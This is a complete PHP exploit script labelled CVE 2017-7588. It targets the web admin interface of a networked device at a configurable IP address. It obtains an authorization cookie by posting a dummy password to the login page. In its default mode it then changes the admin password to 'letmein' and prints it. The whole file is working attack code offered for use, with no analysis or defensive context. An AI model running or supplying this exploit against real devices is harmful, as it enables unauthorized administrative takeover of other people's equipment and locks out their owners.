#CVE 2017-7588
$address = "http://192.168.1.111";

//$mode    = "silent";

$mode    = "changepass";
$newpass = "letmein";


/* ----------------------------- */

$user_agent = 'Mozilla/5.0 (Windows NT 6.1; rv:11.0) Gecko/20100101 Firefox/11.0';
$address = preg_replace('{/$}', '', $address);
libxml_use_internal_errors(true);

function getPwdValue($address) {
	
	global $user_agent;
	
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, $address."/admin/password.html");				
	curl_setopt($ch, CURLOPT_USERAGENT, $user_agent);
	curl_setopt($ch, CURLOPT_COOKIE, getCookie($address));
	curl_setopt($ch, CURLOPT_HEADER, 1);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
	$content = curl_exec($ch);
	
	$dom = new DOMDocument();
    $dom->loadHTML($content);
	$inputs = $dom->getElementsByTagName('input');
	foreach($inputs as $i) {
		if($i->getAttribute('id') === $i->getAttribute('name') && $i->getAttribute('type') === 'password') {
		return $i->getAttribute('name');
		}
	}
	
}

function getLogValue($address) {
			
	global $user_agent;
	
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, $address);				
	curl_setopt($ch, CURLOPT_USERAGENT, $user_agent);
	curl_setopt($ch, CURLOPT_HEADER, 1);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
	$content = curl_exec($ch);
	
	$dom = new DOMDocument();
	$dom->loadHTML($content);
	
	if(strstr($dom->getElementsByTagName('a')->item(0)->nodeValue, 'Please configure the password')) { 
		print 'Seems like password is not set! Exiting.'; exit; }
			
	$value = $dom->getElementById('LogBox')->getAttribute('name');
	return $value;
	
}

function getCookie($host) {
	
	global $address, $user_agent;
	
	$log_var = getLogValue($address);
	
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, $address."/general/status.html");
	curl_setopt($ch, CURLOPT_POST, 1);
	curl_setopt($ch, CURLOPT_POSTFIELDS,
        $log_var."=xyz&loginurl=%2Fgeneral%2Fstatus.html");					
	curl_setopt($ch, CURLOPT_USERAGENT, $user_agent);
	curl_setopt($ch, CURLOPT_HEADER, 1);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
	$content = curl_exec($ch);
	
	if($content == true) {
	$cookies = array();
	preg_match_all('/Set-Cookie:(?<cookie>\s{0,}.*)$/im', $content, $cookies);

	if(!empty($cookies['cookie'])) {
		$exploded = explode(';', $cookies['cookie'][0]);
	} else { print 'Failed getting cookies for '.$address.' address - check your settings'; exit; }
	} else { print 'Got error requesting '.$address.' address - check your settings'; exit; }
	
	return trim($exploded[0]);
	
}

if($mode === "silent") {

	print 'Here\'s your authorization cookie: '.getCookie($address);
	
} elseif ($mode === "changepass") {
	
	global $address, $newpass;
	
	$cookie  = getCookie($address);
	$pwd_var = getPwdValue($address);
	
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, $address."/admin/password.html");
	curl_setopt($ch, CURLOPT_POST, 1);
	curl_setopt($ch, CURLOPT_POSTFIELDS,
            "pageid=1&".$pwd_var."=".$newpass."&temp_retypePass=".$newpass);
	curl_setopt($ch, CURLOPT_COOKIE, $cookie);
	curl_setopt($ch, CURLOPT_USERAGENT, $user_agent);
	curl_setopt($ch, CURLOPT_HEADER, 1);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
	$content = curl_exec($ch);

	if($content == true) {
		print 'Password changed to: '.$newpass;
	} else { print 'Got error requesting '.$address.' address - check your settings'; exit; }	
	
}

?>
            
